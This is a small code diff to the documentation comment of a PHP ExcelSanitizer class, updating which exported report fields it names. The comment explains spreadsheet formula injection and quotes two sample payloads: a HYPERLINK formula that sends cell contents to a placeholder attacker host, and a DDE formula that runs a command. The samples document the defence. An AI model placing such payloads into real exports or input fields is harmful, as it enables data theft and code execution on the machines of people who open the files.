@@ -11,7 +11,7 @@ namespace App\Support;
  *   incluso sobre archivos .xlsx generados por una app web.
  *
  *   Un atacante con sesión que pueda escribir en un campo de texto
- *   (titulo_actividad, lugar, nombre_apellido, etc.) puede inyectar:
+ *   (tipo_actividad, descripcion_actividad, lugar, nombre_apellido, etc.) puede inyectar:
  *
  *     =HYPERLINK("https://evil.tld/?d="&A1, "Click")
  *     =cmd|'/C calc'!A0       (DDE legacy)
@@ -32,7 +32,7 @@ namespace App\Support;
  *   use App\Support\ExcelSanitizer as E;
  *   // ...
  *   return $reportes->map(fn ($r) => [
- *       E::clean($r->titulo_actividad),
+ *       E::clean($r->tipo_actividad),
  *       E::clean($r->lugar),
  *       // ...
  *   ]);
